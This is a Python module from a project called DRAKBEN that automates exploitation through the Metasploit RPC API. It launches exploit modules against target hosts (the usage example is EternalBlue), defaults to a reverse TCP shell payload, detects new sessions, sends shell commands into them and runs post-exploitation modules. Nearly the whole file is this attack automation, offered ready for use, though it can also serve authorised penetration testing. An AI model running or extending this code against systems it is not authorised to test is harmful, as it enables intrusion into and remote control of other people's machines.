# modules/metasploit.py
# DRAKBEN Metasploit RPC Integration
# Automated exploitation through Metasploit Framework

import asyncio
import contextlib
import logging
from dataclasses import dataclass
from enum import Enum
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)

# Optional msgpack for MSFRPC
try:
    import msgpack

    MSGPACK_AVAILABLE = True
except ImportError:
    MSGPACK_AVAILABLE = False
    logger.info("msgpack not installed - using JSON fallback")

# Optional requests for HTTP API
try:
    import requests  # noqa: F401

    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class SessionType(Enum):
    """Metasploit session types."""

    SHELL = "shell"
    METERPRETER = "meterpreter"
    VNC = "vnc"
    UNKNOWN = "unknown"


class ExploitStatus(Enum):
    """Exploit execution status."""

    SUCCESS = "success"
    FAILED = "failed"
    RUNNING = "running"
    NO_SESSION = "no_session"
    ERROR = "error"


@dataclass
class MSFSession:
    """Metasploit session information."""

    session_id: int
    session_type: SessionType
    target_host: str
    target_port: int
    via_exploit: str
    via_payload: str
    username: str = ""
    info: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "session_type": self.session_type.value,
            "target_host": self.target_host,
            "target_port": self.target_port,
            "via_exploit": self.via_exploit,
            "via_payload": self.via_payload,
            "username": self.username,
            "info": self.info,
        }


@dataclass
class ExploitResult:
    """Exploit execution result."""

    status: ExploitStatus
    exploit_name: str
    target: str
    session: MSFSession | None = None
    output: str = ""
    error: str = ""
    duration_seconds: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        return {
            "status": self.status.value,
            "exploit_name": self.exploit_name,
            "target": self.target,
            "session": self.session.to_dict() if self.session else None,
            "output": self.output,
            "error": self.error,
            "duration_seconds": self.duration_seconds,
        }


class MetasploitRPC:
    """Metasploit RPC Client.

    Supports both MSGRPC (msgpack) and REST API.

    Usage:
        msf = MetasploitRPC()
        await msf.connect("127.0.0.1", 55553, "msf", "password")
        result = await msf.run_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.100")
    """

    def __init__(self, use_ssl: bool = False) -> None:
        """Initialize Metasploit RPC client.

        Args:
            use_ssl: Use SSL for connection

        """
        self.host: str = ""
        self.port: int = 55553
        self.token: str = ""
        self.use_ssl = use_ssl
        self.connected = False
        self._session_counter = 0
        logger.info("MetasploitRPC client initialized")

    async def _try_json_rpc_auth(self, url: str, username: str, password: str) -> bool:
        """Try JSON-RPC authentication."""
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.post(
                url,
                json={"method": "auth.login", "params": [username, password]},
                timeout=aiohttp.ClientTimeout(total=10),
            ) as response:
                if response.status != 200:
                    return False
                data = await response.json()
                if "result" in data and "token" in data["result"]:
                    self.token = data["result"]["token"]
                    self.connected = True
                    logger.info("Connected to Metasploit RPC")
                    return True
        return False

    async def _try_msgpack_auth(self, host: str, port: int, username: str, password: str) -> bool:
        """Try msgpack RPC authentication."""
        if not MSGPACK_AVAILABLE:
            return False

        if not await self._connect_msgpack(host, port, username, password):
            return False

        try:
            ver = await self._call("core.version")
            if ver and "version" in ver:
                return True
        except Exception as e:
            logger.warning("Msgpack auth worked but RPC call failed: %s", e)
        return False

    async def connect(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        username: str = "msf",
        password: str = "",
    ) -> bool:
        """Connect to Metasploit RPC server."""
        self.host = host
        self.port = port
        logger.info("Connecting to Metasploit RPC at %s:%s", host, port)

        try:
            protocol = "https" if self.use_ssl else "http"
            url = f"{protocol}://{host}:{port}/api/"

            if await self._try_json_rpc_auth(url, username, password):
                return True

            if await self._try_msgpack_auth(host, port, username, password):
                return True

            logger.warning("Could not connect to Metasploit RPC")
            return False

        except Exception as e:
            logger.exception("Connection error: %s", e)
            return False

    async def _connect_msgpack(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
    ) -> bool:
        """Connect using msgpack RPC (Async)."""
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=10,
            )

            # Send auth request
            request = msgpack.packb(["auth.login", username, password])
            writer.write(request)
            await writer.drain()

            # Receive response
            response = await asyncio.wait_for(reader.read(65535), timeout=10)
            result = msgpack.unpackb(response, raw=False)

            if "token" in result:
                self.token = result["token"]
                self.connected = True
                # Note: We close this temporary auth socket because MSFRPC
                # usually requires a new connection per request or HTTP persistence.
                # Keeping raw socket open for RPC commands is complex
                # without a full async msgpack client implementation.
                # For now, we assume if auth works, we fallback to HTTP/HTTPS which is supported.
                return True

            return False

        except Exception as e:
            logger.exception("Msgpack RPC error: %s", e)
            return False
        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception as e:
                    logger.debug("Error closing writer: %s", e)

    async def disconnect(self) -> None:
        """Disconnect from Metasploit RPC."""
        if self.connected and self.token:
            with contextlib.suppress(Exception):
                await self._call("auth.logout", [self.token])

        self.connected = False
        self.token = ""
        logger.info("Disconnected from Metasploit RPC")

    async def _call(
        self,
        method: str,
        params: list[Any] | None = None,
    ) -> dict[str, Any]:
        """Call RPC method.

        Args:
            method: Method name
            params: Parameters

        Returns:
            Response dictionary

        """
        if not self.connected:
            msg = "Not connected to Metasploit RPC"
            raise ConnectionError(msg)

        params = params or []

        try:
            protocol = "https" if self.use_ssl else "http"
            url = f"{protocol}://{self.host}:{self.port}/api/"

            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(
                    url,
                    json={"method": method, "token": self.token, "params": params},
                    timeout=aiohttp.ClientTimeout(total=60),
                ) as response:
                    return await response.json()

        except Exception as e:
            logger.exception("RPC call error: %s", e)
            return {"error": str(e)}

    async def list_payloads(self, search: str = "") -> list[str]:
        """List available payloads.

        Args:
            search: Search filter

        Returns:
            List of payload names

        """
        result = await self._call("module.payloads")
        payloads = result.get("result", {}).get("modules", [])

        if search:
            payloads = [p for p in payloads if search.lower() in p.lower()]

        return payloads

    async def list_sessions(self) -> list[MSFSession]:
        """List active sessions.

        Returns:
            List of MSFSession objects

        """
        result = await self._call("session.list")
        sessions = []

        for sid, info in result.get("result", {}).items():
            try:
                session_type = SessionType.SHELL
                if "meterpreter" in info.get("type", "").lower():
                    session_type = SessionType.METERPRETER
                elif "vnc" in info.get("type", "").lower():
                    session_type = SessionType.VNC

                sessions.append(
                    MSFSession(
                        session_id=int(sid),
                        session_type=session_type,
                        target_host=info.get("target_host", ""),
                        target_port=info.get("target_port", 0),
                        via_exploit=info.get("via_exploit", ""),
                        via_payload=info.get("via_payload", ""),
                        username=info.get("username", ""),
                        info=info.get("info", ""),
                    ),
                )
            except Exception as e:
                logger.exception("Error parsing session: %s", e)

        return sessions

    # ------------------------------------------------------------------
    # Module inspection
    # ------------------------------------------------------------------

    async def get_module_info(self, module_type: str, module_name: str) -> dict[str, Any]:
        """Retrieve metadata for a Metasploit module.

        Args:
            module_type: One of ``exploit``, ``auxiliary``, ``post``, ``payload``.
            module_name: Full module path, e.g. ``windows/smb/ms17_010_eternalblue``.

        Returns:
            Module information dict (name, description, authors, references…).
        """
        result = await self._call("module.info", [module_type, module_name])
        return result.get("result", result)

    async def get_module_options(self, module_type: str, module_name: str) -> dict[str, Any]:
        """Return configurable options for a module.

        Args:
            module_type: Module category (``exploit``, ``auxiliary``, …).
            module_name: Full module path.

        Returns:
            Dict mapping option names to their metadata (type, required,
            default, description).
        """
        result = await self._call("module.options", [module_type, module_name])
        return result.get("result", result)

    # ------------------------------------------------------------------
    # Exploit execution
    # ------------------------------------------------------------------

    async def run_exploit(
        self,
        exploit_name: str,
        target_host: str,
        *,
        target_port: int | None = None,
        payload: str = "generic/shell_reverse_tcp",
        lhost: str = "0.0.0.0",
        lport: int = 4444,
        options: dict[str, Any] | None = None,
        poll_interval: float = 2.0,
        max_wait: float = 120.0,
    ) -> ExploitResult:
        """Execute a Metasploit exploit module against *target_host*.

        Submits the exploit as an asynchronous RPC job, polls for completion,
        and checks whether a new session was created.

        Args:
            exploit_name: Full exploit module path
                (e.g. ``exploit/windows/smb/ms17_010_eternalblue``).
            target_host: Remote target IP / hostname (``RHOSTS``).
            target_port: Remote target port (``RPORT``).  Omit to use default.
            payload: Payload module to deliver.
            lhost: Local listener address for reverse payloads.
            lport: Local listener port.
            options: Extra module options (``{"key": "value"}``).
            poll_interval: Seconds between job-status polls.
            max_wait: Maximum seconds to wait for a session.

        Returns:
            :class:`ExploitResult` with status, session, and output.
        """
        import time as _time

        if not self.connected:
            return ExploitResult(
                status=ExploitStatus.ERROR,
                exploit_name=exploit_name,
                target=target_host,
                error="Not connected to Metasploit RPC",
            )

        # Normalise exploit path (strip leading "exploit/" if present)
        exploit_name = exploit_name.removeprefix("exploit/")

        # Build option map
        module_opts: dict[str, Any] = {
            "RHOSTS": target_host,
            "PAYLOAD": payload,
            "LHOST": lhost,
            "LPORT": lport,
        }
        if target_port is not None:
            module_opts["RPORT"] = target_port
        if options:
            module_opts.update(options)

        t0 = _time.monotonic()
        logger.info(
            "Launching exploit %s against %s (payload=%s)",
            exploit_name,
            target_host,
            payload,
        )

        # Snapshot existing sessions so we can detect new ones
        pre_sessions = {s.session_id for s in await self.list_sessions()}

        # Submit exploit as an RPC job
        result = await self._call("module.execute", ["exploit", exploit_name, module_opts])
        job_id = result.get("job_id") or result.get("result", {}).get("job_id")

        if job_id is None:
            error_msg = result.get("error_message") or result.get("error") or str(result)
            logger.warning("Exploit submission failed: %s", error_msg)
            return ExploitResult(
                status=ExploitStatus.FAILED,
                exploit_name=exploit_name,
                target=target_host,
                error=error_msg,
                duration_seconds=_time.monotonic() - t0,
            )

        logger.info("Exploit job %s submitted, polling for session…", job_id)

        new_session = await self._poll_for_session(
            job_id,
            pre_sessions,
            poll_interval,
            max_wait,
            t0,
        )

        duration = _time.monotonic() - t0

        if new_session:
            logger.info("Session %d opened on %s!", new_session.session_id, target_host)
            return ExploitResult(
                status=ExploitStatus.SUCCESS,
                exploit_name=exploit_name,
                target=target_host,
                session=new_session,
                duration_seconds=duration,
            )
        return ExploitResult(
            status=ExploitStatus.NO_SESSION,
            exploit_name=exploit_name,
            target=target_host,
            error="Exploit completed but no session was created",
            duration_seconds=duration,
        )

    async def _poll_for_session(
        self,
        job_id: int | str,
        pre_sessions: set[int],
        poll_interval: float,
        max_wait: float,
        t0: float,
    ) -> MSFSession | None:
        """Poll Metasploit RPC until a new session appears or the job finishes."""
        import time as _time

        while (_time.monotonic() - t0) < max_wait:
            await asyncio.sleep(poll_interval)

            # Check if job is still running
            jobs_result = await self._call("job.list")
            active_jobs = jobs_result.get("result", jobs_result)
            job_running = str(job_id) in (str(k) for k in active_jobs)

            # Check for new sessions
            for sess in await self.list_sessions():
                if sess.session_id not in pre_sessions:
                    return sess

            if not job_running:
                logger.info("Job %s finished without a session", job_id)
                return None

        return None

    # ------------------------------------------------------------------
    # Session interaction
    # ------------------------------------------------------------------

    async def session_shell_write(self, session_id: int, command: str) -> str:
        """Write a command to an active shell session.

        Args:
            session_id: Target session identifier.
            command: Shell command to execute.

        Returns:
            Raw output from the session, or an error string.
        """
        result = await self._call(
            "session.shell_write",
            [session_id, command + "\n"],
        )
        if "error" in result:
            return f"Error: {result['error']}"

        # Give the command time to execute, then read output
        await asyncio.sleep(1)
        return await self.session_shell_read(session_id)

    async def session_shell_read(self, session_id: int) -> str:
        """Read pending output from a shell session.

        Args:
            session_id: Target session identifier.

        Returns:
            Buffered shell output.
        """
        result = await self._call("session.shell_read", [session_id])
        return result.get("data", result.get("result", {}).get("data", ""))

    async def session_stop(self, session_id: int) -> bool:
        """Terminate an active session.

        Args:
            session_id: Session to kill.

        Returns:
            ``True`` if the session was stopped.
        """
        result = await self._call("session.stop", [str(session_id)])
        return result.get("result") == "success"

    async def run_post_module(
        self,
        session_id: int,
        module_name: str,
        options: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Execute a post-exploitation module against an open session.

        Args:
            session_id: Active session to operate on.
            module_name: Post module path (e.g. ``multi/gather/env``).
            options: Extra module options.

        Returns:
            Module execution result dict.
        """
        opts: dict[str, Any] = {"SESSION": session_id}
        if options:
            opts.update(options)
        result = await self._call("module.execute", ["post", module_name, opts])
        return result.get("result", result)
